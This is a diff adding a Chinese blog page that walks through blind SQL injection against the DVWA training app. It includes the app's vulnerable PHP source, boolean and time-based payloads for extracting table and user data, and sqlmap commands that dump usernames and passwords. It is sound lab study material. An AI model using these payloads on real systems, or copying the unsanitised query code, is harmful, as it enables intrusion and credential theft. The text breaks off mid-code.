@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="前言记录学习DVWA中的SQL盲注过程，包括手工注入、SQLmap注入两部分。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA SQL Injection (Blind)">
+<meta property="og:url" content="https://leeyuxun.github.io/DVWA-SQL-Injection-Blind.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="前言记录学习DVWA中的SQL盲注过程，包括手工注入、SQLmap注入两部分。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116223220.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116232325.png">
+<meta property="article:published_time" content="2019-11-16T03:59:36.000Z">
+<meta property="article:modified_time" content="2020-11-16T15:47:46.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="SQLmap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/DVWA-SQL-Injection-Blind.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>DVWA SQL Injection (Blind) | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/DVWA-SQL-Injection-Blind.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA SQL Injection (Blind)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-11-16 11:59:36" itemprop="dateCreated datePublished" datetime="2019-11-16T11:59:36+08:00">2019-11-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-16 23:47:46" itemprop="dateModified" datetime="2020-11-16T23:47:46+08:00">2020-11-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DVWA/" itemprop="url" rel="index"><span itemprop="name">DVWA</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录学习DVWA中的SQL盲注过程，包括手工注入、SQLmap注入两部分。<span id="more"></span></p>
+<p>目的：爆破数据库，通过SQL注入，找到dvwa网站所有的用户名及密码。</p>
+<h1 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># low.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="subst">$id</span>';"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$getid</span>); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$num</span> &gt; <span class="number">0</span> ) {</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="variable">$_SERVER</span>[<span class="string">'SERVER_PROTOCOL'</span>].<span class="string">' 404 Not Found'</span>);</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析：直接拼接sql语句没有任何处理，查询结果只有<code>User ID exists in the database</code>和<code>User ID is MISSING from the database</code>。</p>
+<h2 id="手动注入"><a href="#手动注入" class="headerlink" title="手动注入"></a>手动注入</h2><h3 id="注入判断"><a href="#注入判断" class="headerlink" title="注入判断"></a>注入判断</h3><ol>
+<li> 输入<code>1' and 1=1;#</code>， 输出<code>User ID exists in the database</code></li>
+<li> 输入<code>1' and 1=2;#</code>，输出<code>User ID is MISSING from the database</code></li>
+</ol>
+<p>判断为字符型注入；</p>
+<h3 id="猜解当前数据库信息"><a href="#猜解当前数据库信息" class="headerlink" title="猜解当前数据库信息"></a>猜解当前数据库信息</h3><h4 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h4><p>输入<code>1' and length(database())=4;#</code>，返回<code>User ID exists in the database</code>，表明数据库名长度为4(这里需要不断尝试)；</p>
+<h4 id="猜解数据库名"><a href="#猜解数据库名" class="headerlink" title="猜解数据库名"></a>猜解数据库名</h4><p>使用<strong>二分法</strong>猜解数据库名；</p>
+<p>输入<code>1' and ascii(substr(database(),1,1)) &gt; 100;#</code>，输出<code>User ID is MISSING from the database</code></p>
+<p>输入<code>1' and ascii(substr(database(),1,1)) &lt; 100;#</code>，输出<code>User ID is MISSING from the database</code></p>
+<p>判断出数据库名的第一个ascii字符为100，就是d，按照以上方法猜解出数据库名dvwa；</p>
+<h3 id="猜解表信息"><a href="#猜解表信息" class="headerlink" title="猜解表信息"></a>猜解表信息</h3><h4 id="猜解表数目"><a href="#猜解表数目" class="headerlink" title="猜解表数目"></a>猜解表数目</h4><p>输入<code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=2;#</code>，返回<code>User ID exists in the database</code>，表明有两个数据表；</p>
+<h4 id="猜解表长度"><a href="#猜解表长度" class="headerlink" title="猜解表长度"></a>猜解表长度</h4><p>输入<code>1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9; #</code>，返回<code>User ID exists in the database</code>，说明第一个表的长度为9；</p>
+<h4 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h4><p>输入<code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103;#</code>，返回<code>User ID is MISSING from the database</code></p>
+<p>输入<code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103;#</code>，返回<code>User ID is MISSING from the database</code></p>
+<p>表明第一个表名的第一个字母是g；</p>
+<p>按照上述操作，猜解出两个表名分别为 guestbook，users；</p>
+<h3 id="猜解字段信息"><a href="#猜解字段信息" class="headerlink" title="猜解字段信息"></a>猜解字段信息</h3><h4 id="猜解字段数量"><a href="#猜解字段数量" class="headerlink" title="猜解字段数量"></a>猜解字段数量</h4><p>输入<code>1' and (select count(column_name) from information_schema.columns where table_name='users')=8;#</code>，输出<code>User ID exists in the database</code>，表明users表的字段数量为8；</p>
+<h4 id="猜解字段名"><a href="#猜解字段名" class="headerlink" title="猜解字段名"></a>猜解字段名</h4><p>输入<code>1' and length(substr((select column_name from informtion_schema.columns where table_name='users' limit 0,1),1))=7；#</code>，输出<code>User ID exists in the database</code>，表明users表中第一个字段长度是7位，使用二分法可猜解出字段名；</p>
+<h3 id="猜解字段"><a href="#猜解字段" class="headerlink" title="猜解字段"></a>猜解字段</h3><p>以猜解user字段为例</p>
+<h4 id="猜解字段长度"><a href="#猜解字段长度" class="headerlink" title="猜解字段长度"></a>猜解字段长度</h4><p>输入<code>1' and length(substr((select user from users limit 0,1),1))=5;#</code>，输出<code>User ID exists in the database</code>，表明user的长度为5；</p>
+<h4 id="猜解字段值"><a href="#猜解字段值" class="headerlink" title="猜解字段值"></a>猜解字段值</h4><p>输入<code>1' and ascii(substr((select user from users limit 0,1),1,1))&gt;97;#</code>，输出<code>User ID is MISSING from the database</code></p>
+<p>输入<code>1' and ascii(substr((select user from users limit 0,1),1,1))&lt;97;#</code>，输出<code>User ID is MISSING from the database</code></p>
+<p>表明第一个字段为a；</p>
+<p>按照上述操作，利用二分法依次猜解；</p>
+<p><strong>注意</strong>：以上猜解的方法，除了利用<strong>基于布尔的盲注方式</strong>，还可以利用<strong>基于时间延迟的盲注</strong>进行操作。此时，需要结合if函数和sleep()函数来测试不同判断条件导致的延迟效果差异，如：<code>1' and if(length(database())&gt;10,sleep(5),1) #</code>， if条件中即数据库的库、表、字段、字段值的获取和数值大小比较，若服务器响应时执行了sleep()函数，则判断if中的条件为真，否则为假。</p>
+<h2 id="SQLmap注入"><a href="#SQLmap注入" class="headerlink" title="SQLmap注入"></a>SQLmap注入</h2><p>与上篇博客的注入方式一致，例如输入<code>sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie="security=low; PHPSESSID=4bq2qmdt2kkomp9qfvp3ko9rhd" -D dvwa -T users -C user,password --dump</code>直接爆破users表；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png"></p>
+<h1 id="MEDIUM"><a href="#MEDIUM" class="headerlink" title="MEDIUM"></a>MEDIUM</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#medium.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_POST</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$id</span>) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$getid</span>); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>){</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">//mysql_close();</span></span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>分析：后端使用了post获取ID，且前端使用了下拉来限制输入；</p>
+<p>此时只用burpsuite抓包更改即可，方式和LOW Security Level的方式相同；</p>
+<p>SQLmap扫描只需将数据包包存后使用SQLmap指令直接扫描即可，例如<code>sqlmap -r data.txt -p id -D dvwa -T users -C user,password --dump</code>指令可以直接爆破数据表，其中data.txt存储请求数据信息；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116221207.png"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116223220.png"></p>
+<h1 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#high.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">'id'</span>])){</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Check database</span></span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="subst">$id</span>' LIMIT 1;"</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>], <span class="variable">$getid</span>); <span class="comment">// Removed 'or die' to suppress mysql errors</span></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="variable">$num</span> = @<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>); <span class="comment">// The '@' character suppresses errors</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$num</span>&gt;<span class="number">0</span>){</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="comment">// Might sleep a random amount</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">5</span>)==<span class="number">3</span>){</span><br><span class="line">                <span class="title function_ invoke__">sleep</span>(<span class="title function_ invoke__">rand</span>(<span class="number">2</span>,<span class="number">4</span>));</span><br><span class="line">            }</span><br><span class="line">            <span class="comment">// User wasn't found, so the page wasn't!</span></span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="variable">$_SERVER</span>[<span class="string">'SERVER_PROTOCOL'</span>].<span class="string">'404 Not Found'</span>);</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>;</span><br><span class="line">        }</span><br><span class="line">        ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">"___mysqli_ston"</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>分析：使用了cookie获取ID，limit限制现实结果只有1个，rand函数扰乱基于时间的盲注；</p>
+<p>手工注入只需要使用burpsuite抓包，更改cookie中的id参数值即可；</p>
+<p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止常规的SQLMap扫描注入测试，因为SQLMap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入；</p>
+<p>但是并不代表High级别不能用SQLMap进行注入测试，此时需要利用其非常规的命令联合操作，如：<code>--second-url="xxxurl"</code>（设置二阶响应的结果显示页面的url）</p>
+<p>由于采用了cookie获取ID，这里设置level为2，用于检测cookie中提交的信息；</p>
+<p>说明：<strong>level为2级时，检测cookie；level为3级时，检测user-Agent/Referer；</strong></p>
+<p>尝试使用<code>sqlmap -r data.txt --second-url "http://localhost/DVWA/vulnerabilities/sqli_blind/index.php" -p id --level 2</code>命令检测SQL注入漏洞，结果检测出SQL盲注漏洞，后续的注入按照SQLmap注入方式注入即可；</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20201116232325.png"></p>
+<h1 id="IMPOSSIBLE"><a href="#IMPOSSIBLE" class="headerlink" title="IMPOSSIBLE"></a>IMPOSSIBLE</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#impossible.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'Submit'</span>])){</span><br><span class="line">        <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">        <span class="title function_ invoke__">checkToken</span>(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">'id'</span>];</span><br><span class="line">        <span class="comment">// Was a number entered?</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>)){</span><br><span class="line">            <span class="comment">// Check the database</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span>);</span><br><span class="line">            <span class="variable">$data</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">':id'</span>,<span class="variable">$id</span>,PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line">            <span 